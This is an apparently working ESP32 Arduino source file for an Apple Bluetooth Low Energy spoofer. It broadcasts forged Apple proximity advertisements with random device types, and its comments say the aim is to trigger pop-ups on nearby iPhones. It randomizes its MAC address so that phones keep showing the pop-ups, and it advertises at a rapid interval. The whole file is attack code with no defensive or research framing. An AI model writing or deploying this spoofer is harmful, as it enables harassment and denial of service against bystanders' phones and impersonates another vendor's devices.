#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>

BLEAdvertising *pAdvertising;

// FIX 1: Changed std::string to a standard const char* array
const char* apple_uuid = "00003082-0000-1000-9000-00805f9b34fb";

uint8_t spoof_packet[17];
bool spooferInitialized = false;

BLEAdvertisementData generateApplePayload() {
    BLEAdvertisementData advData = BLEAdvertisementData();
    uint8_t i = 0;

    spoof_packet[i++] = 17 - 1;
    spoof_packet[i++] = 0xFF;
    spoof_packet[i++] = 0x4C;
    spoof_packet[i++] = 0x00;
    spoof_packet[i++] = 0x0F;
    spoof_packet[i++] = 0x05;
    spoof_packet[i++] = 0xC1;
    
    // Apple device payload types (AirPods, Apple TV, etc)
    const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
    spoof_packet[i++] = types[random(sizeof(types))];
    
    // Fill the rest with random garbage to trigger the popups
    for(int r=0; r<3; r++) spoof_packet[i++] = random(256);
    spoof_packet[i++] = 0x00;
    spoof_packet[i++] = 0x00;
    spoof_packet[i++] = 0x10;
    for(int r=0; r<3; r++) spoof_packet[i++] = random(256);

    // FIX 2: Replaced std::string casting with the (char*, length) overload
    advData.addData((char *)spoof_packet, 17);
    
    return advData;
}

void startAppleSpoofer() {
    if (!spooferInitialized) {
        BLEDevice::init("Shark_Thiren");
        BLEServer *pServer = BLEDevice::createServer();
        pAdvertising = pServer->getAdvertising();
        spooferInitialized = true;
    }

    // Randomize the MAC address so iPhones don't ignore it after the first popup
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xF0; // Ensure it's a valid random static address
    }
    
    BLEAdvertisementData advData = generateApplePayload();
    
    pAdvertising->addServiceUUID(apple_uuid);
    pAdvertising->setAdvertisementData(advData);
    
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setMinPreferred(0x20);
    pAdvertising->setMaxPreferred(0x20);
    
    pAdvertising->start();
}

void stopAppleSpoofer() {
    if (spooferInitialized) {
        pAdvertising->stop();
    }
}